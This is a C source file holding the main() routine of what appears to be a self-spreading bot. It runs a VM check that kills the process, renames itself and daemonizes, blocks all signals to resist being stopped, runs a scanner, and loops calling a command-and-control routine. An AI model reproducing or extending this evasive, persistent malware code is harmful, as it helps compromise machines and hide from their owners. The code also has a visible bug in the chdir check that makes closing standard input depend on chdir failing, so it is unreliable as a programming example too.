#include "../include/main.h"

int main(void)
{
    printd("Debug on!");

    // Initilize many things
    randInit();
    printd("randInit ok");
    obfsc_init(); // Must be called first so we kill ourselves if it's a VM
    printd("obfsc_init ok");
    proc_init();
    printd("proc_init ok");
    scan_init();
    printd("scan_init ok");
    comm_init();
    printd("comm_init ok");

#ifndef DEBUG
    prctl(PR_SET_NAME, MAIN_NAME, 0, 0, 0); // Change the process name

    pid_t pid, sid; /* Our process ID and Session ID */

    pid = fork(); /* Fork off the parent process */
    if (pid < 0)
	exit(EXIT_FAILURE);
    /* If we got a good PID, then
  we can exit the parent process. */
    if (pid > 0)
	exit(EXIT_SUCCESS);

    umask(0); /* Change the file mode mask */

    /* Open any logs here */

    if ((sid = setsid()) < 0) /* Create a new SID for the child process */
	exit(EXIT_FAILURE);

    if ((chdir("/")) < 0)
	// Do something?

	/* Close out the standard file descriptors */
	close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Ignore all signals that we can
    sigset_t mask;
    sigfillset(&mask);
    sigprocmask(SIG_SETMASK, &mask, NULL);

#endif // DEBUG

    printd("Starting!");

#ifdef SCANNER_FORCE
    printd("Scanner test mode detected!");
    scan_scanner();
    exit(1);
#endif // SCANNER_FORCE

    while (1)
    {
		if (comm_comm() == false)
		    exit(1);
		sleep(COMM_TIMEOUT);
    }
}
